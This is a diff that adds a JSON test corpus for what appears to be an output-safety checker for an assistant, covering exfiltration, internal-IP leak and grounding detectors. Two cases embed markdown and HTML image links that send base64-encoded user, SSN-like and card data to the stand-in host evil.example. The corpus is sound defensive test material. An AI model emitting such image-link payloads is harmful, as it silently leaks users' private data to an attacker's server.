@@ -1,0 +1,60 @@
+{
+  "doc": "GW33 output corpus: shapes of live tests L33-1..L33-3 plus negatives. Used by tests/detect/test_gw33_corpus.py (offline equivalent, not the live gate).",
+  "allow_hosts": [
+    "cdn.example.com"
+  ],
+  "context": [
+    "Our refund policy allows returns within thirty days of purchase. Shipping takes five business days for domestic orders."
+  ],
+  "cases": [
+    {
+      "id": "L33-1-image",
+      "detector": "exfil",
+      "text": "Here is your summary. ![x](https://evil.example/log?d=dXNlcj1hbGljZTtzc249MTIzLTQ1LTY3ODk7Y2FyZD00MTEx)",
+      "expect": "finding"
+    },
+    {
+      "id": "L33-1-html-img",
+      "detector": "exfil",
+      "text": "<img src=\"https://evil.example/p.gif?x=dXNlcj1hbGljZTtzc249MTIzLTQ1LTY3ODk7Y2FyZD00MTEx\">",
+      "expect": "finding"
+    },
+    {
+      "id": "L33-1-neg-logo",
+      "detector": "exfil",
+      "text": "Our logo: ![logo](https://cdn.example.com/assets/logo.png)",
+      "expect": "clean"
+    },
+    {
+      "id": "L33-1-neg-link",
+      "detector": "exfil",
+      "text": "See [the docs](https://docs.python.org/3/library/re.html) for details.",
+      "expect": "clean"
+    },
+    {
+      "id": "L33-2-host-and-rfc1918",
+      "detector": "ip_leak",
+      "text": "The service runs on db.internal at 10.12.4.9 behind the proxy.",
+      "expect": "finding",
+      "spans": 2
+    },
+    {
+      "id": "L33-2-neg-public",
+      "detector": "ip_leak",
+      "text": "Google DNS is 8.8.8.8 and the docs example is 192.0.2.10; version v1.2.3.4-rc1.",
+      "expect": "clean"
+    },
+    {
+      "id": "L33-3-ungrounded",
+      "detector": "grounding",
+      "text": "Purple elephants orchestrate quantum bakeries throughout Antarctica every Tuesday.",
+      "expect": "finding"
+    },
+    {
+      "id": "L33-3-neg-grounded",
+      "detector": "grounding",
+      "text": "Our refund policy allows returns within thirty days of purchase.",
+      "expect": "clean"
+    }
+  ]
+}
